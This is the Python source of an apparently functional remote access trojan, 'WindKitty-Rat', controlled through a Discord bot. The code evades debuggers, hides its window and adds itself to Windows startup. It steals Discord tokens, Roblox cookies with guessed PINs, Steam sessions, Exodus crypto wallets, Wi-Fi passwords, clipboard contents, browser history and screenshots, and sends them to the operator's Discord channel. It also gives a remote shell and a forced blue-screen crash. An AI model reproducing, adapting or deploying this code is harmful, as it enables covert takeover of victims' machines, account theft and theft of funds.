################## < NEEDED IMPORTS > #################
import discord
from discord.ext import commands
import socket
from discord import Embed
import subprocess,os
import pyautogui,random, string
import ctypes
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from json import loads
from base64 import b64decode
from sqlite3 import connect
from shutil import copy2
from threading import Thread
from re import search, findall
from requests import get
import requests,tempfile
from browser_history import get_history
import zipfile,shutil,browser_cookie3
import sqlite3,json,base64,psutil,threading
import time,pygame
from pathlib import Path
import webbrowser


################## < NEEDED IMPORTS > #################

################## < BASIC ANTIDEBUG > ################
k32 = ctypes.WinDLL('kernel32')
isdebdet = k32.IsDebuggerPresent() 

if isdebdet:
     exit()
else:
    pass

prcnhan = k32.GetCurrentProcess()

isdebdet1 = ctypes.c_int(0)
k32.CheckRemoteDebuggerPresent(prcnhan, ctypes.byref(isdebdet1))

if isdebdet1:
    exit()
else:
    pass
################## < BASIC ANTIDEBUG > ################


################## < HIDES THE CURRENT WINDOW > #################
class User32:
    @staticmethod
    def hidewind(hwnd, n_cmd_show):
        return ctypes.windll.user32.ShowWindow(hwnd, n_cmd_show)

class Kernel32:
    @staticmethod
    def get_console_window():
        return ctypes.windll.kernel32.GetConsoleWindow()

kitty_hide = 0
kitty_wind = Kernel32.get_console_window()
User32.hidewind(kitty_wind, kitty_hide)
################## < HIDES THE CURRENT WINDOW > #################


###########< TURNING OFF/ON MONITOR + FUNCS> #################
###########< NEEDED VARS >##############
HWND_BROADCAST = 0xFFFF                #
WM_SYSCOMMAND = 0x0112                 #
SC_MONITORPOWER = 0xF170               #
MONITOR_OFF = -1                       #
MONITOR_ON = 2                         #
###########< NEEDED VARS >##############

def onmonitor():
    ctypes.windll.user32.SendNotifyMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_OFF)

def offmonitor():
    ctypes.windll.user32.SendNotifyMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_ON)

###########< TURNING OFF/ON MONITOR + FUNCS> #################


################## < NOT MY CODE, REWRRITTEN FROM KDOT AND SMUG > #################

def getdcinfo():
    all_tokens = []
    appdata = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    encrypt_regex = r"dQw4w9WgXcQ:[^\"]*"
    normal_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    baseurl = "https://discord.com/api/v9/users/@me"
    tokens = []
    ids = []

    paths = {
        "Discord": roaming + "\\discord\\Local Storage\\leveldb\\",
        "Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
        "Lightcord": roaming + "\\Lightcord\\Local Storage\\leveldb\\",
        "Discord PTB": roaming + "\\discordptb\\Local Storage\\leveldb\\",
        "Opera": roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        "Opera GX": roaming + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
        "Amigo": appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
        "Torch": appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
        "Kometa": appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
        "Orbitum": appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
        "CentBrowser": appdata + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
        "7Star": appdata + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
        "Sputnik": appdata + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
        "Vivaldi": appdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
        "Chrome SxS": appdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
        "Chrome": appdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
        "Chrome1": appdata + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
        "Chrome2": appdata + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
        "Chrome3": appdata + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
        "Chrome4": appdata + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
        "Chrome5": appdata + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
        "Epic Privacy Browser": appdata + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
        "Microsoft Edge": appdata + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
        "Uran": appdata + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
        "Yandex": appdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
        "Brave": appdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
        "Iridium": appdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
    }

    def decrypt_val(buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_key(path):
        if not os.path.exists(path):
            return

        if "os_crypt" not in open(path, "r", encoding="utf-8").read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()

        local_state = loads(c)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key

    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        disc = name.replace(" ", "").lower()
        if "cord" in path:
            if os.path.exists(roaming + f"\\{disc}\\Local State"):
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                        if x.strip()
                    ]:
                        for y in findall(encrypt_regex, line):
                            try:
                                token = decrypt_val(
                                    b64decode(y.split("dQw4w9WgXcQ:")[1]),
                                    get_key(roaming + f"\\{disc}\\Local State"),
                                )
                            except:
                                token = "ERROR"
                            r = get(
                                baseurl,
                                headers={
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                    "Content-Type": "application/json",
                                    "Authorization": token,
                                },
                            )
                            if r.status_code == 200:
                                uid = r.json()["id"]
                                if uid not in ids:
                                    tokens.append(token)
                                    ids.append(uid)
        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for token in findall(normal_regex, line):
                        r = get(
                            baseurl,
                            headers={
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                "Content-Type": "application/json",
                                "Authorization": token,
                            },
                        )
                        if r.status_code == 200:
                            uid = r.json()["id"]
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)

    if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
        for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for _file in files:
                if not _file.endswith(".sqlite"):
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{_file}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for token in findall(normal_regex, line):
                        r = get(
                            baseurl,
                            headers={
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                "Content-Type": "application/json",
                                "Authorization": token,
                            },
                        )
                        if r.status_code == 200:
                            uid = r.json()["id"]
                            if uid not in ids:
                                tokens.append(token)

    tmp1 = os.getenv("TEMP")
    storetoken = os.path.join(tmp1, "tokens.txt")

    remove_dup = [*set(all_tokens)]
    with open(storetoken, "a+", encoding="utf-8", errors="ignore") as f:
        for item in tokens:
            f.write(f"{item}\n")

    with open(storetoken, 'r') as file:
        token = file.read().strip()

    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)

    kittyusrinf = response.json()

    return kittyusrinf
################## < NOT MY CODE, REWRRITTEN FROM KDOT AND SMUG ITS A GRABBER THAT GETS TOKENS. > #################


################## < SNS = SAVE N SAVE. > #################

async def sns(ctx, t, d):
    if not d:
        return await ctx.send(f'No {t} found.')

    n = f'{t.lower()}.txt'
    temp22 = os.path.join(os.environ['TEMP'], 'df')  

    os.makedirs(temp22, exist_ok=True)

    p = os.path.join(temp22, n)
    
    with open(p, 'w') as f:
        f.write('\n'.join(d))

    embed = discord.Embed(title=f'{t} File', description=f'Here\'s your {t} file, pookie bear >.<')
    embed.set_footer(text='WindKitty-Rat made by evilbytecode.')

    embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')

    await ctx.send(embed=embed, file=discord.File(p))
    os.remove(p)
################## < SNS = SAVE N SAVE. > #################


################## < KEY GENERATION PROCESS + VALIDATION. > #################
def genwindkittykey():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))


async def validate_key(ctx, key):
    if not validkittykeys:
        await ctx.send(":warning: Bot is still initializing. Please wait and try again.")
        return False

    if key not in validkittykeys:
        return False

    return True
################## < KEY GENERATION PROCESS + VALIDATION. > #################


################## < BSOD TRIGGER NO UAC NEEDED. > #################
ntdll = ctypes.WinDLL('ntdll.dll')

def rtl_adjust_privilege(privilege, enable_privilege, thread_privilege, previous_value):
    return ntdll.RtlAdjustPrivilege(privilege, enable_privilege, thread_privilege, ctypes.byref(previous_value))

def nt_raise_hard_error(error_status, number_of_parameters, unicode_string_parameter_mask, parameters, valid_response_option, response):
    return ntdll.NtRaiseHardError(error_status, number_of_parameters, unicode_string_parameter_mask, parameters, valid_response_option, ctypes.byref(response))
################## < BSOD TRIGGER NO UAC NEEDED. > #################



################## < FUNCTION THAT STEALS  A ROBLOX COOKIE AND GETS INFO ABOUT ACCOUNT. > #################
def rbxcookie():
    cookies = {}
    browsers = [('Chrome', browser_cookie3.chrome), ('Edge', browser_cookie3.edge), ('Firefox', browser_cookie3.firefox), ('Safari', browser_cookie3.safari), ('Opera', browser_cookie3.opera), ('Brave', browser_cookie3.brave), ('Vivaldi', browser_cookie3.vivaldi)]
    for browser_name, browser in browsers:
        try:
            browser_cookies = browser(domain_name='roblox.com')
            for cookie in browser_cookies:
                if cookie.name == '.ROBLOSECURITY':
                    cookies[browser_name] = cookie.value
        except:
            pass
    return cookies

def get_user_info(cookie):
    url = 'https://www.roblox.com/mobileapi/userinfo'
    headers = {
        'User-Agent': 'Roblox/WinInet',
        'Cookie': f'.ROBLOSECURITY={cookie}'
    }
    response = requests.get(url, headers=headers)
    return response.json()

def pininfo(cookie):
    url = 'https://users.roblox.com/v1/birthdate'
    headers = {
        'User-Agent': 'Roblox/WinInet',
        'Cookie': f'.ROBLOSECURITY={cookie}'
    }
    response = requests.get(url, headers=headers)
    return response.json()

def coolinfo(cookie):
    url = 'https://www.roblox.com/my/settings/json'
    headers = {
        'User-Agent': 'Roblox/WinInet',
        'Cookie': f'.ROBLOSECURITY={cookie}'
    }
    response = requests.get(url, headers=headers)
    return response.json()
################## < FUNCTION THAT STEALS  A ROBLOX COOKIE AND GETS INFO ABOUT ACCOUNT. > #################




################## < DISCORD CONFIGURATION > #################
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)
validkittykeys = {}  # Store valid keys here
config = {
    'token': "%token%",
    'server_id': '%id%'
}

################## < DISCORD CONFIGURATION > #################



################## < BEGINNING OF DISCORD RAT COMMANDS > #################
################## < HELP COMMAND > #################

@bot.command(name='help')
@commands.cooldown(1, 5, commands.BucketType.user)
async def help_command(ctx):
    embed = discord.Embed(title='WindKitty-Rat Commands',description='List of available commands for WindKitty-Rat.',color=discord.Color.blurple())

    cmds = [
        {'name': 'installedprograms', 'description': 'List installed programs on the host machine.', 'example': '.installedprogramy <your key>'},
        {'name': 'swapmouse', 'description': 'Swap mouse buttons.', 'example': '.swapmouse <your key>'},
        {'name': 'bsod', 'description': 'Trigger a Blue Screen of Death (BSOD).', 'example': '.bsod <your key>'},
        {'name': 'screenshot', 'description': 'Capture a screenshot of the host machine.', 'example': '.screenshot <your key>'},
        {'name': 'randomwallpaper', 'description': 'Set a random cat wallpaper.', 'example': '.randomwallpaper <your key>'},
        {'name': 'clipboard', 'description': 'Steal clipboard info.', 'example': '.clipboard <your key>'},
        {'name': 'history', 'description': 'Steal browser history.', 'example': '.history <your key>'},
        {'name': 'steam', 'description': 'Steal Steam session information.', 'example': '.steam <your key>'},
        {'name': 'exodus', 'description': 'Steal a Exodus wallet.', 'example': '.exodus <your key>'},
        {'name': 'rocookie', 'description': 'Steal a Roblox cookie.', 'example': '.rocookie <your key>'},
        {'name': 'tasklist', 'description': 'Get a list of running tasks on the host machine.', 'example': '.tasklist <your key>'},
        {'name': 'shell', 'description': 'Execute a shell command on the host machine.', 'example': '.shell <your key> <command>'},
        {'name': 'website', 'description': 'Opens a Website on Hosts Computer.', 'example': '.website <your key> https://example.com'},
        {'name': 'exit', 'description': 'Exits Discord Bot.', 'example': '.exit <your key>'},
        {'name': 'wifi', 'description': 'All Info about Wlan.', 'example': '.wifi <your key>'},
        {'name': 'telegram', 'description': 'Telegram Session Files.', 'example': '.telegram <your key>'},
        {'name': 'turnoffmonitor', 'description': 'Turns off victims monitor', 'example': '.turnoffmonitor <your key>'},
        {'name': 'turnonmonitor', 'description': 'Turns on victims monitor', 'example': '.turnonmonitor <your key>'},
        {'name': 'pcscrape', 'description': 'Scrapes info on users computer', 'example': '.turnoffmonitor .pcscrape <your key>'}

    ]


    for cmdinf in cmds:
        embed.add_field(name=f'.{cmdinf["name"]}', value=f'{cmdinf["description"]} Example: `{cmdinf["example"]}`', inline=False)

    embed.set_footer(text='WindKitty-Rat made by evilbytecode.')
    embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')

    await ctx.send(embed=embed)

################## < HELP COMMAND > #################
def zipkitty(kittyput, kittynameuuwu):
    shutil.make_archive(kittynameuuwu, 'zip', kittyput)
################## < ON ERROR HANDLER > #################

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Please provide the required arguments for the command.")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("Invalid argument. Please check your input.")
    else:
        print(f"An error occurred: {error}")

################## < ON CMD ERROR HANDLER > #################

################## < ON READY > #################
@bot.event
async def on_ready():
    windkittyuserpcname1 = socket.gethostname()
    guild = discord.utils.get(bot.guilds, id=int(config['server_id']))

    if guild:
        channel_name = f"WindKitty-Rat-{windkittyuserpcname1}"
        channel = discord.utils.get(guild.channels, name=channel_name)

        if not channel:
            channel = await guild.create_text_channel(channel_name)

        key = genwindkittykey()
        validkittykeys[key] = bot.user.id
        sumofchannels = sum(len(guild.channels) for guild in bot.guilds)

        ratmonitor = discord.Game(f"Rat is connect to over {sumofchannels} Computers")
        await bot.change_presence(activity=ratmonitor)
        embed = discord.Embed(title="WindKitty-Rat", description=f"Connected to: {windkittyuserpcname1}\nYour WindKitty key is: `{key}`", color=discord.Color.blurple())
        embed.set_footer(text='WindKitty-Rat made by evilbytecode, use .help for commands.')
        embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')
        await channel.send(embed=embed)

        accinf = getdcinfo()

        if accinf:
            UE = discord.Embed(title="User Information", color=discord.Color.blurple())
            UE.set_thumbnail(url=f'https://cdn.discordapp.com/avatars/{accinf["id"]}/{accinf["avatar"]}.png?size=512')
            UE.add_field(name="ID", value=accinf["id"], inline=False)
            UE.add_field(name="Username", value=accinf["username"], inline=False)
            UE.add_field(name="Global Name", value=accinf["global_name"], inline=False)
            UE.add_field(name="Email", value=accinf["email"], inline=False)
            UE.add_field(name="Verified", value=accinf["verified"], inline=False)
            tknpath = os.path.join(os.getenv("TEMP"), "tokens.txt")
            with open(tknpath, 'r') as file:
                token = file.read().strip()
                UE.add_field(name="Token", value=f"```{token}```", inline=False)
            await channel.send(embed=UE)
            os.remove(tknpath)
            embed = discord.Embed(title=':warning: Please wait!', description=".zip file with user's info is being sent, wait minute. thanks", color=discord.Color.yellow())
            await channel.send(embed=embed)
        kittyput = os.path.join(os.environ['TEMP'], 'WindKitty')
        sockdeskname = socket.gethostname()
        kittyname = os.path.join(os.environ['TEMP'], f'windkitty-grabbed-{sockdeskname}.zip')

        zipkitty(kittyput, kittyname)

        await channel.send(file=discord.File(kittyname))
        os.remove(kittyname)
        ####################### THIS IS STARTUP! ##########################################################
        windkittycurrentrunningfile, windkittystartupdir = os.path.abspath(__file__), os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

        filecheckifitexitsyk = os.path.join(windkittystartupdir, os.path.basename(windkittycurrentrunningfile))
        if not os.path.exists(filecheckifitexitsyk):
            os.system(f'attrib +h +s "{windkittycurrentrunningfile}"')
            shutil.move(windkittycurrentrunningfile, filecheckifitexitsyk)
        else:
            pass
        ####################### THIS IS STARTUP! ##########################################################

    else:
            await channel.send("Failed to fetch user information... :rofl:, dont worry were sending zip info")

################## < ON READY > #################


################## < TASKLIST COMMAND > #################

@bot.command(name='tasklist')
@commands.cooldown(1, 5, commands.BucketType.user)
async def beziciprocesy(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return

    try:
        output = subprocess.run(["powershell", r'Get-Process | Select-Object ProcessName, Id | Format-Table -AutoSize'], stdout=subprocess.PIPE, text=True).stdout.split('\n')[2:]
        await sns(ctx, 'Running Processes', output)
    except Exception as e:
        await ctx.send(f'Error: {e}')
################## < TASKLIST COMMAND > #################

################## < INSTALLED PROGRAMS COMMAND > #################
@bot.command(name='installedprograms')
@commands.cooldown(1, 5, commands.BucketType.user)
async def nainstlovaneprogramy(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return

    try:
        command_output = subprocess.run(["powershell", r'(Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate) | Format-Table -AutoSize'], stdout=subprocess.PIPE, text=True).stdout.split('\n')[2:]
        await sns(ctx, 'Installed Programs', command_output)
    except Exception as e:
        await ctx.send(f'An error occurred: {e}')
################## < INSTALLED PROGRAMS COMMAND > #################


################## < SWAP MOUSE COMMAND > #################

@bot.command(name='swapmouse')
@commands.cooldown(1, 5, commands.BucketType.user)
async def swap_mouse(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    await ctx.send("Mouse buttons swapped successfully.") if not subprocess.run(["powershell", "Start-Process rundll32.exe -ArgumentList 'user32.dll,SwapMouseButton' -NoNewWindow -Wait"], shell=True).returncode else await ctx.send("An error occurred.")
################## < SWAP MOUSE COMMAND > #################

################## < SCREENSHOT COMMAND > #################
@bot.command(name='screenshot')
@commands.cooldown(1, 5, commands.BucketType.user)
async def delamsiskrinshot(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    embed = discord.Embed(title=':warning: Please wait!', description="Command was executed! please wait, screenshot is being sent.", color=discord.Color.yellow())
    await ctx.send(embed=embed)
    obrazovka = pyautogui.screenshot()
    obrazovka.save("screenshot.png")
    await ctx.send(file=discord.File("screenshot.png"))
################## < SCREENSHOT COMMAND > #################
    

################## < BSOD COMMAND > #################

@bot.command(name='bsod')
@commands.cooldown(1, 5, commands.BucketType.user)
async def bsod(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    
    t1 = ctypes.c_bool()
    t2 = ctypes.c_uint()

    rtl_adjust_privilege(19, True, False, t1)
    nt_raise_hard_error(0xc0000022, 0, 0, None, 6, t2)
    embed = discord.Embed(title='BSOD', description='Sucessfully Executed Command.')
    embed.set_footer(text='WindKitty-Rat made by evilbytecode.')

    embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')

    await ctx.send(embed=embed)
################## < BSOD COMMAND > #################

################## < RANDOM WALLPAPER COMMAND THAT USES catasapi > #################

@bot.command(name='randomwallpaper')
@commands.cooldown(1, 5, commands.BucketType.user)
async def catwallpaper(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    

    for process in ["wallpaper32.exe"]:
        os.system(f"taskkill /F /IM {process} 2>nul")

    tmpcatwallpaper = os.path.join(os.path.expandvars('%TEMP%'), 'mylilkittyuwu.jpg')
    with open(tmpcatwallpaper, 'wb') as f:
        f.write(requests.get("https://cataas.com/cat?filter=custom&brightness=1.5&saturation=50").content)

    SPI_SETDESKWALLPAPER, SPIF_SENDCHANGE = 0x0014, 0x02
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, tmpcatwallpaper, SPIF_SENDCHANGE)
    embed = discord.Embed(title='Random Cat Wallpaper', description='Sucessfully Executed Command.')
    embed.set_footer(text='WindKitty-Rat made by evilbytecode.')

    embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')

    await ctx.send(embed=embed)
################## < RANDOM WALLPAPER COMMAND THAT USES catasapi > #################

################## < Clipboard Command > #################

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def clipboard(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    try:
        
        result = subprocess.check_output(['powershell', 'Get-Clipboard'], text=True)

        embed = discord.Embed(title='Clipboard Info', description=result)
        embed.set_footer(text='WindKitty-Rat made by evilbytecode.')
        embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')
        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(title='Error', description=f"An error occurred: {e}, so basically command didnt execute", color=discord.Color.red())
        await ctx.send(embed=embed)
################## < Clipboard Command > #################

################## < History Command > #################
@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def history(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return

    if key:
     embed = discord.Embed(title=':warning: Please wait!', description="Command was executed! please wait, before using new one.", color=discord.Color.yellow())
    await ctx.send(embed=embed)
    outputs = get_history()
    his = outputs.histories

    temp_dir = os.path.join(os.environ['TEMP'], 'thighlover123washere')

    os.makedirs(temp_dir, exist_ok=True)

    history_path = os.path.join(temp_dir, 'his.txt')

    with open(history_path, 'w') as file:
        for entry in his:
            file.write(f"{entry[0]} - {entry[1]}\n")

    await ctx.send(file=discord.File(history_path))
    os.remove(history_path)
################## < History Command > #################


################## < STEAM Command > #################

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def steam(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    if key:
        embed = discord.Embed(title=':warning: Please wait!', description="Command was executed! please wait, before using new one.", color=discord.Color.yellow())
    await ctx.send(embed=embed)
    v1 = ""
    if os.path.exists(os.environ["PROGRAMFILES(X86)"] + "\\steam"):
        v1 = os.environ["PROGRAMFILES(X86)"] + "\\steam"
        v2 = []
        v3 = ""
        for file in os.listdir(v1):
            if file[:4] == "ssfn":
                v2.append(v1 + f"\\{file}")

        def v4(path, path1, steam_session):
            for root, dirs, file_name in os.walk(path):
                for file in file_name:
                    steam_session.write(root + "\\" + file)
            for file2 in path1:
                steam_session.write(file2)

        if os.path.exists(v1 + "\\config"):
            with zipfile.ZipFile(f"{os.environ['TEMP']}\\steam_session.zip", 'w', zipfile.ZIP_DEFLATED) as zp:
                v4(v1 + "\\config", v2, zp)

            await ctx.send("Steam Session:", file=discord.File(f"{os.environ['TEMP']}\\steam_session.zip"))

            try:
                os.remove(f"{os.environ['TEMP']}\\steam_session.zip")
            except:
                pass
################## < STEAM Command > #################


################## < EXODUS Command > #################

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def exodus(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return
    if key:
     user = os.path.expanduser("~")
    embed = discord.Embed(title=':warning: Please wait!', description="Command was executed! please wait, before using new one.", color=discord.Color.yellow())
    await ctx.send(embed=embed)
    v1 = user + "\\AppData\\Roaming\\Exodus"
    v2 = user + "\\AppData\\Local\\Temp\\Exodus"
    v3 = user + "\\AppData\\Local\\Temp\\Exodus.zip"

    if os.path.exists(v2):
        shutil.rmtree(v2)

    if os.path.exists(v1):
        shutil.copytree(v1, v2)
        shutil.make_archive(v2, "zip", v2)

        await ctx.send(file=discord.File(v3))

        try:
            os.remove(v3)
            os.remove(v2)
        except Exception as e:
            print(f"Error: {e}")
################## < EXODUS Command > #################

## this is my old commands, just adding them dont judge the way i used to code tysm python is not best language and neverwill be.. switch to real ones :rofl:
cookies = rbxcookie()
################## < ROBLOX COOKIE STEALING Command > #################
@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def rocookie(ctx, key=None):
    if not key or not await validate_key(ctx, key):
        return


    if key:
        embed = discord.Embed(title=':warning: Please wait!', description="Command was executed! please wait, before using new one.", color=discord.Color.yellow())
        await ctx.send(embed=embed)
        
        cookies = rbxcookie()
        for browser_name, cookie_value in cookies.items():
            user_info = get_user_info(cookie_value)
            cool_info = coolinfo(cookie_value)
            pin_info = pininfo(cookie_value)

            username = user_info.get('UserName', 'Unknown')
            is_premium = user_info.get('IsPremium', False)
            user_id = user_info.get('UserID', 'Unknown')
            rbxbal = user_info.get('RobuxBalance', 0)
            thumbnell = user_info.get('ThumbnailUrl', '')

            year = pin_info.get('birthYear', 'Unknown')
            month = str(pin_info.get('birthMonth', '00')).zfill(2)
            day = str(pin_info.get('birthDay', '00')).zfill(2)
            likely = [username[:4], username[-4:], year, day+day, month+month, month+day, day+month]
            likely = [str(x) for x in likely if str(x).isdigit() and len(str(x)) == 4]

            accage = cool_info.get('AccountAgeInDays', 0)
            lastip = cool_info.get('ClientIpAddress', '')

            roliapi = f"https://www.rolimons.com/playerapi/player/{user_id}"
            response = requests.get(roliapi)
            plrdat = response.json()
            rap = plrdat.get('value', 'N/A')

            embed = discord.Embed(
                title=f'New .ROBLOSECURITY cookie found in {browser_name} browser',
                description=(
                    f'[Rolimons](https://www.rolimons.com/player/{user_id}) | [Roblox](https://www.roblox.com/users/{user_id}/profile)\n'
                    f'👤 **Username:** {username}\n'
                    f'🛡️ **Is Premium:** {":white_check_mark:" if is_premium else ":x:"}\n'
                    f'🔢 **ID:** {user_id}\n'
                    f'💰 **Robux Balance:** {rbxbal}\n'
                    f'📈 **(RAP) Recent Average Price:** {rap}\n'
                    f'📅 **Account Age:** {accage} days\n'
                    f'🌐 **IP Address:** {lastip}\n'
                    f'💡 **Likely Pins:** {", ".join(likely)}\n'
                    f'🍪 **Cookie:** ```{cookie_value}```\n'
                ),
                color=0x9b59b6,
            )
            embed.set_thumbnail(url=thumbnell)
            await ctx.send(embed=embed)
################## < ROBLOX COOKIE STEALING Command > #################

################## < REMOTE SHELL Command > #################
@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def shell(ctx, key=None, *, command: str):
    if not key or not await validate_key(ctx, key):
        return
    if key:
        try:
            subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            embed = discord.Embed(title='Shell Info', description='Executed successfully')
            embed.set_footer(text='WindKitty-Rat made by evilbytecode.')
            embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')
            await ctx.send(embed=embed)
        except subprocess.CalledProcessError as e:
            pass
    else:
        pass
################## < REMOTE SHELL Command > #################

################## < OPEN WEBSITE Command > #################

@bot.command(name='website')
@commands.cooldown(1, 5, commands.BucketType.user)
async def opnsite(ctx, key, wburi):
    if not await validate_key(ctx, key):
        return
    os.system(f'start {wburi}')
    embed = discord.Embed(description=f'Opened {wburi} successfully...')
    await ctx.send(embed=embed)
################## < OPEN WEBSITE Command > #################


@bot.command(name='exit')
async def exit_command(ctx, key=None):
    if not await validate_key(ctx, key):
           return

    await ctx.send("Shutting down... Bye!")
    os.system('cls')
    await bot.close()



@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def blackscreen(ctx, key=None):
    if not await validate_key(ctx, key):
        return
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
    embed = discord.Embed(description='Black screen executed successfully...')
    await ctx.send(embed=embed)

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def wifi(ctx, key=None):
    if not await validate_key(ctx, key):
        return
    embed = discord.Embed(title=':warning: Please wait!', description="Command was executed! please wait, data is being sent, it might take a minute.", color=discord.Color.yellow())
    await ctx.send(embed=embed)
    kittywifi = os.path.join(tempfile.gettempdir(), "wlan.txt")
    kittyprof = [line.split(":")[1].strip() for line in subprocess.run(["netsh", "wlan", "show", "profile"], stdout=subprocess.PIPE, text=True, errors='ignore').stdout.splitlines() if "All User Profile" in line]
    with open(kittywifi, 'w') as output_file:
      for prf in kittyprof:
        output_file.write(subprocess.run(["netsh", "wlan", "show", "profile", prf, "key=clear"], stdout=subprocess.PIPE, text=True, errors='ignore').stdout)
    embed = discord.Embed(description='Wifi Network Info stolen sucessfully...')
    await ctx.send(embed=embed, file=discord.File(kittywifi))
    os.remove(kittywifi)


@bot.command(name='telegram')
@commands.cooldown(1, 5, commands.BucketType.user)
async def telegram_command(ctx, key=None):
    if not await validate_key(ctx, key):
        return
